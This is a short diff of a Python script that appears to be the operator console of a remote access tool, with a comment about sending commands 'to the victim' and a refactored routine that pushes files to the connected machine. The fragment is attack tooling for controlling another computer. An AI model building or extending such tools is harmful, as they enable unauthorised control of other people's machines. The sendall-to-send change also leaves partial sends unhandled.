@@ -53,7 +53,7 @@ def recvLen():
 def sendBytes(bytesToSend):
     global conn
     if conn != None:
-        conn.sendall(bytesToSend)            
+        conn.send(bytesToSend)            
             
 def sendLen(dat):
     l = len(dat)
@@ -185,17 +185,25 @@ def filterCommand(command):
         print(currentDir())
     # SEND FILES
     elif "put-" in command:
-        stop = True
         send(command)
-        data = readFile(command.split("-")[1],True)
-        sendLen(data)
-        sendBytes(data)
-        stop = False
+        sendFileByteMode(command.split("-")[1])
     else:  
         # SEND THE COMMAND TO THE VICTIM    
         send(command)
                 
-
+def sendFileByteMode(file):
+    global stop
+    try:
+        stop = True
+        data = readFile(file, True)
+        sendLen(data)
+        time.sleep(1)
+        sendBytes(data)
+        time.sleep(1)
+        stop = False
+        
+    except Exception as e:      
+        stop = False  
                     
 def helpPrinter():
     print("""
